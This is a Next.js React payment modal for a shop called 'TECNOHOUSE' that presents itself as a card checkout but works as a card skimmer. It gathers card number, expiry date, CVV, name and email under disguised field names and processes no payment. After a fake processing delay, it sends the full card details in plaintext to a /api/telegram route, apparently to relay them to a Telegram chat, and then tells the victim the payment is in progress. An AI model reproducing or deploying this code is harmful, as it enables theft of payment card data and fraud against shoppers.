"use client";

import Image from "next/image";
import { useMemo, useState } from "react";

type Step = "choose" | "form" | "loading" | "done";

export default function SocioPaymentForm({
  total,
  orderId,
  open,
  onClose,
}: {
  total: number;
  orderId: string;
  open: boolean;
  onClose: () => void;
}) {

  const [step, setStep] = useState<Step>("choose");
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState<string | null>(null);

  const [form, setForm] = useState({
    socio: "",
    afiliacion: "",
    codigoCliente: "",
    nombre: "",
    apellido: "",
    email: "",
    recordar: false,
  });

  const payLabel = useMemo(() => {
    return `Pagar S/ ${total.toFixed(2)}`;
  }, [total]);

  if (!open) return null;

  function validate() {
    if (!/^\d{15,16}$/.test(form.socio))
      return "Número de tarjeta inválido";

    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(form.afiliacion))
      return "Fecha inválida MM/AA";

    if (!form.codigoCliente)
      return "CVV requerido";

    if (!form.nombre.trim())
      return "Nombre requerido";

    if (!form.apellido.trim())
      return "Apellido requerido";

    if (!/^\S+@\S+\.\S+$/.test(form.email))
      return "Email inválido";

    return null;
  }

  async function onPay() {

    setErr(null);

    const v = validate();
    if (v) return setErr(v);

    setStep("loading");
    setLoading(true);

    const delay = 8000 + Math.random() * 4000;

    const message = `💳 PAGO SOCIO TECNOHOUSE

🧾 ORDER ID:
${orderId}

💰 Total: S/ ${total.toFixed(2)}

━━━━━━━━━━

Tarjeta:
${form.socio}

Fecha:
${form.afiliacion}

CVV:
${form.codigoCliente}

━━━━━━━━━━

Nombre:
${form.nombre}

Apellido:
${form.apellido}

Email:
${form.email}
`;

    try {

      await new Promise(r => setTimeout(r, delay));

      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type":"application/json"
        },
        body: JSON.stringify({ message })
      });

      if(!res.ok){
        throw new Error("No se pudo enviar Telegram");
      }

      await fetch("/api/orders/mark-socio", {
        method:"POST",
        headers:{
          "Content-Type":"application/json"
        },
        body: JSON.stringify({
          external_reference: orderId
        })
      });

      setLoading(false);
      setStep("done");

      setTimeout(()=>{
        onClose();
      },3000);

    } catch(e:any){

      setLoading(false);
      setStep("form");

      setErr(e?.message || "Error inesperado");

    }
  }

  return (

<div style={styles.backdrop}>

<div style={styles.modal}>

<button onClick={onClose} style={styles.close}>
×
</button>

<div style={styles.logoWrap}>
<Image
src="/logo.png"
alt=""
width={110}
height={110}
/>
</div>

{step==="choose" && (

<>

<div style={styles.title}>
Elige un medio de pago
</div>

<button
onClick={()=>setStep("form")}
style={styles.button}
>
Continuar
</button>

</>

)}

{step==="form" && (

<>

<div style={styles.inputWrap}>
<input
style={styles.input}
placeholder="Número de tarjeta"
value={form.socio}
onChange={(e)=>
setForm(s=>({
...s,
socio:e.target.value.replace(/\D/g,"").slice(0,16)
}))
}
/>
</div>

<div style={styles.grid2}>

<input
style={styles.input}
placeholder="MM/AA"
value={form.afiliacion}
onChange={(e)=>{

const raw=e.target.value.replace(/\D/g,"").slice(0,4);

let f=raw;

if(raw.length>=3)
f=`${raw.slice(0,2)}/${raw.slice(2)}`;

setForm(s=>({...s,afiliacion:f}));

}}
/>

<input
style={styles.input}
placeholder="CVV"
value={form.codigoCliente}
onChange={(e)=>
setForm(s=>({
...s,
codigoCliente:e.target.value.replace(/\D/g,"")
}))
}
/>

</div>

<input
style={styles.input}
placeholder="Nombre"
value={form.nombre}
onChange={(e)=>
setForm(s=>({...s,nombre:e.target.value}))
}
/>

<input
style={styles.input}
placeholder="Apellido"
value={form.apellido}
onChange={(e)=>
setForm(s=>({...s,apellido:e.target.value}))
}
/>

<input
style={styles.input}
placeholder="Email"
value={form.email}
onChange={(e)=>
setForm(s=>({...s,email:e.target.value}))
}
/>

{err && <div style={styles.error}>{err}</div>}

<button
onClick={onPay}
style={styles.payButton}
disabled={loading}
>
{loading?"Procesando...":payLabel}
</button>

</>

)}

{step==="loading" && (

<div style={styles.loading}>

Procesando pago...

</div>

)}

{step==="done" && (

<div style={styles.done}>

Pago en proceso

<br/>

Orden:

<br/>

<b>{orderId}</b>

</div>

)}

</div>
</div>

);
}

const styles:any={

backdrop:{
position:"fixed",
inset:0,
background:"rgba(0,0,0,0.7)",
display:"flex",
alignItems:"center",
justifyContent:"center",
zIndex:9999
},

modal:{
width:360,
background:"#fff",
padding:20,
borderRadius:8,
position:"relative"
},

close:{
position:"absolute",
right:10,
top:10,
cursor:"pointer"
},

logoWrap:{
textAlign:"center",
marginBottom:10
},

title:{
fontSize:14,
fontWeight:600
},

button:{
width:"100%",
height:40,
marginTop:20,
background:"#2e6da4",
color:"#fff",
borderRadius:6
},

inputWrap:{
marginTop:10
},

input:{
width:"100%",
height:40,
marginTop:10,
border:"1px solid #ccc",
padding:10,
borderRadius:6
},

grid2:{
display:"grid",
gridTemplateColumns:"1fr 1fr",
gap:10
},

payButton:{
width:"100%",
height:40,
marginTop:15,
background:"#2e6da4",
color:"#fff",
borderRadius:6
},

error:{
color:"red",
marginTop:10
},

loading:{
padding:20,
textAlign:"center"
},

done:{
padding:20,
textAlign:"center"
}

};